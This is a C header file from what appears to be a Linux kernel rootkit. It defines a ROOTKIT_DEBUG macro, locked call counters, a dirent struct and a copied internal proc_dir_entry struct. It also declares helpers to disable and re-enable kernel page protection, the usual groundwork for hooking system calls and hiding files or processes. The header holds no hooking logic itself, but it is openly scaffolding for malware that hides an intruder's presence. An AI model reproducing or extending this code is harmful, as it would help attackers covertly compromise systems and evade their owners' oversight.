#ifndef INCLUDE_HEADER
#define INCLUDE_HEADER

#include <linux/module.h>
#include <linux/spinlock.h>
#include <linux/types.h>

#include "control.h"
#include "sysmap.h"

/* 
 * Some macros
 */

/* print to kernel log if debugging is enabled */
#ifdef DEBUG
#define ROOTKIT_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
#else
#define ROOTKIT_DEBUG(...)
#endif

/* safely increase a call counter */
#define INCREASE_CALL_COUNTER(counter, lock, flags)		\
spin_lock_irqsave(lock, flags);					\
counter++;							\
spin_unlock_irqrestore(lock, flags);

/* safely decrease a call counter */
#define DECREASE_CALL_COUNTER(counter, lock, flags)		\
spin_lock_irqsave(lock, flags);					\
counter--;							\
spin_unlock_irqrestore(lock, flags);

/*
 * Some structs
 */

/* dirent structure */
struct linux_dirent {   
        unsigned long   d_ino;   
        unsigned long   d_off;   
        unsigned short  d_reclen;   
        char            d_name[1];   
};

/* since this struct is no longer available in proc_fs, taken from fs/proc/internal.h */
struct proc_dir_entry {
          unsigned int low_ino;
          umode_t mode;
          nlink_t nlink;
          kuid_t uid;
          kgid_t gid;
          loff_t size;
          const struct inode_operations *proc_iops;
          const struct file_operations *proc_fops;
          struct proc_dir_entry *next, *parent, *subdir;
          void *data;
          atomic_t count;	/* use count */
          atomic_t in_use;	/* number of callers into module in progress; */
				/* negative -> it's going away RSN */
          struct completion *pde_unload_completion;
          struct list_head pde_openers;   /* who did ->open, but not ->release */
          spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
          u8 namelen;
          char name[];
};

/*
 * Some helper functions
 */

void
disable_page_protection (void);

void
enable_page_protection (void);

ssize_t
get_path (unsigned int fd, char *path, size_t bufsiz);

#endif
